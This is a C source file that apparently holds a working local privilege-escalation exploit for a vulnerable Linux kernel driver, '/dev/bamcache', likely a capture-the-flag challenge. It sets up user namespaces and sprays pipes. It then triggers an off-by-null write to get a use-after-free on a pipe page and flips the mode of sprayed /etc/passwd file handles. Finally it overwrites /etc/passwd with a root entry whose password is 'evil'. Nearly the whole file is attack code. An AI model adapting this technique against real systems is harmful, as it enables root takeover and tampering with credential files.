#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");

#define ALLOC 0xcafe01
#define DELETE 0xcafe02
#define EDIT 0xcafe03

typedef struct
{
    int64_t idx;
    uint64_t size;
    char *buf;    
}user_req_t;

int dev_fd;

int open_device()
{
    int fd = open("/dev/bamcache", O_RDWR);
    if(fd==-1){
        perror("[-] open(/dev/bamcache)");
        return EXIT_FAILURE;
    }

    puts("[+] Device opened");

    return fd;
}

int bam_add(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, ALLOC, &req);
    if(ret==-1){
        perror("[-] bamcache: add failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_edit(uint64_t idx, uint64_t size, char *buff)
{
    user_req_t req = {
        .idx = idx,
        .size = size,
        .buf = buff
    };

    int ret = ioctl(dev_fd, EDIT, &req);
    if(ret==-1){
        perror("[-] bamcache: edit failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_del(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, DELETE, &req);
    if(ret==-1){
        perror("[-] bamcache: delete failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}


#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 0x80
#define FILE_NUM 0x100

int pipe_fd[PIPE_NUM][2];

int file_fd[FILE_NUM];

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;
  
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
 
    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);
  
    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
  
    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}  

void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}


int main(int argc, char **argv, char **envp)
{
    cpu_set_t   cpu_set;

    puts("\033[32m\033[1m[+] Bamcache no leak page-uaf.\033[0m");

    unshare_setup();

    // run the exp on specific core only
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    
    void *tmp = malloc(0x1000);

    size_t pipe_magic;
    for(int i=0;i<PIPE_NUM;i++)
    {
        if(pipe(pipe_fd[i])<0)
        {
            errExit("PIPE_ERROR.");
        }
    }


    for(int i=0;i<PIPE_NUM;i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }
    }

    for(int i=0;i<PIPE_NUM;i++)
    {
        if(i%0x10!=0)
        {
            memcpy(tmp,"bambamx7",0x8);
            pipe_magic = 0xdeadbeef+i;
            write(pipe_fd[i][1],tmp,0x8);
            write(pipe_fd[i][1],&pipe_magic,0x8);
        }
        
    }
    // getchar();

    puts("[*] Create hole.");
    for(int i=0x10;i<PIPE_NUM;i+=0x10)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
    puts("[*] Trigger off by null");

    char bam_buff[0x1000];

    dev_fd = open_device();
    for(int i = 1; i < 10; i++){
        bam_add(i);
    }

    *(uint32_t*)&bam_buff[0x1000-8] = 1;

    for(int i = 1; i < 10; i++){
        bam_edit(i, 0x1000, bam_buff);
    }

    size_t victim_id = 0;
    size_t prev_id = 0;
    size_t magic = 0;
    char *tmp_content = malloc(0x1000);
    for(int i=0;i<PIPE_NUM;i++)
    {
        if(i%0x10)
        {
            read(pipe_fd[i][0],tmp_content,0x8);
            read(pipe_fd[i][0],&magic,0x8);
            if(!strncmp(tmp_content,"bambamx7",8)&&magic!=0xdeadbeef+i)
            {
                victim_id = magic-0xdeadbeef;
                prev_id = i;
                BLUE printf("[*] Found the two pipe 0x%x and 0x%x\n",victim_id,prev_id);
                break;
            }
        }
    }
    if(!victim_id)
    {
        perror("[*] Not found two pipe.");
        for(int i = 1; i < 10; i++){
            bam_del(i);
        }
        close(dev_fd);
        return -1;
    }

    write(pipe_fd[prev_id][1],tmp_content,0x3c+0x8);

    // getchar();
    puts("[*] UAF one of the pipe->page.");
    close(pipe_fd[victim_id][0]);
    close(pipe_fd[victim_id][1]);

    puts("[*] Spray passwd file...");

    for(int i=0;i<FILE_NUM;i++)
    {
        file_fd[i] = open("/etc/passwd",0);
        if(!file_fd[i])
        {
            perror("Open busybox ERROR!");
            for(int i = 1; i < 10; i++){
                bam_del(i);
            }
            close(dev_fd);
            return -1;
        }
    }

    // getchar();
    int a[2];
    a[0] = 0x480e801f;
    write(pipe_fd[prev_id][1], a, 4);

    printf("Creating the pwd.bck\n");

    system("cp /etc/passwd /tmp/passwd.bak");

    char *data = "root:$1$evil$B1cg.QF41pkr9LUa9L0vm1:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt evil evil
    printf("Setting root password to \"evil\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd file");
    //what we want to edit pipe->page
    for (int i = 0;i < FILE_NUM; i++) {
        int retval = write(file_fd[i], data,data_size);
            if (retval > 0)
            {
               RED printf("Write Success:%d!\n",i); CLOSE
            }

        }

    // getchar();
    // //0xe801f
    
    // GREEN puts("[*] Edit the file for busybox f_mode..."); CLOSE
}